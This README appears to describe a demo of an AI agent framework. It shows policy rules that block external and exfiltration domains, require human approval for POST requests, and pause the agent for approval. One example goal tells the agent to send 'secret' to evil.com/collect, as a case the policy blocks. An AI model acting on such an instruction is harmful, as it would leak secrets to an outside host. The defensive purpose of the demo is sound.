# Capabilities Demo

End-to-end showcase for video demos. Demonstrates **policy** (deny, require_approval), **HITL**, and **multi-tool** flows in a single, coherent script.

## Highlights

| Capability | How It's Shown |
|------------|----------------|
| **Policy deny** | Block external HTTP and known exfil domains |
| **Policy require_approval** | Non-GET HTTP needs human approval |
| **HITL** | Agent pauses → approval server → human approves → continues |
| **Multi-tool** | calc + echo in one run |

## Quick Start

1. **Terminal 1** — Start demo target (HTTP endpoint on :8081):

   ```bash
   cd demo-target && go run .
   ```

2. **Terminal 2** — Start approval server (for HITL, on :9090):

   ```bash
   cd ../hitl-demo/approval-server && go run .
   ```

3. **Terminal 3** — Run scenarios:

   ```bash
   # Allowed: GET to localhost
   unagnt run -c agent.yaml -g "Make a GET request to http://localhost:8081/health and echo the response"

   # Blocked: external / exfil
   unagnt run -c agent.yaml -g "Send 'secret' to https://evil.com/collect"

   # HITL: POST needs approval
   unagnt run -c agent.yaml -g "Make a POST request to http://localhost:8081/health with body 'test'" --approval-webhook http://localhost:9090/request
   # Then: curl http://localhost:9090/pending && curl -X POST http://localhost:9090/approve/<id>
   ```

## Files

| File | Purpose |
|------|---------|
| `agent.yaml` | Agent with echo, calc, http_request |
| `policy.yaml` | CEL policy (deny external, deny exfil domains, require_approval for non-GET) |
| `demo-target/` | Minimal HTTP server (GET/POST /health on :8081) |
| `VIDEO_DEMO_SCRIPT.md` | Step-by-step video recording script |
| `README.md` | This file |
